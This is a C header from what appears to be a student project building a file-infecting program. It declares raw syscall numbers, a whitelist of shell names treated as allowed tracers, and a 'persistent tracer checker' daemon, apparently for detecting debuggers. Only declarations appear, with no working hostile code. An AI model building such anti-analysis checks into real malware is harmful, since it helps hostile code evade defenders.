/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   persistent_tarcer.h                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 19:21:27 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 19:44:52 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef PERSISTENT_TRACER_H
# define PERSISTENT_TRACER_H

# include "infection.h"

# include <sys/syscall.h>
# include <stdlib.h>
# include <unistd.h>
# include <fcntl.h>
# include <sys/types.h>
# include <signal.h>
# include <sys/stat.h>
# include <dirent.h>
# include <string.h>
# include <stdio.h>
# include <sys/mman.h>

#define ALLOWED_TRACERS         {"bash", "zsh", "csh", "sh", "dash", "ksh93", "tcsh", "fish", "rbash", "ksh", 0}

#define SUCCESS                 0
#define FAILURE                 1

/*
**      --> SYSCALLS INDEX
*/
#define SYS_READ                0
#define SYS_WRITE               1
#define SYS_OPEN                2
#define SYS_CLOSE               3
#define SYS_STAT                4
#define SYS_LSEEK               8
#define SYS_MMAP                9
#define SYS_MUNMAP              11
#define SYS_GETDENTS64          217

/*
**      --> PARSE UTILS
*/
char                            **get_cmd_lines(char **files, char *dir_path, char recursion);
char                            *get_file_base_name(const char *path);
char                            *get_file_data(const char *filename);
char                            *read_file_data(int fd, size_t size);

/*
**      --> TRACER UTILS
*/
typedef struct		            s_tracer
{
	char			            *cmdline;
	char			            *status_name;
	char			            *status;
}					            t_tracer;

int                             get_pid(char is_parent);
char                            allowed_tracer(t_tracer *tracer);

/*
**      --> DEAMON
*/
void                            persistent_tracer_checker(void);

#endif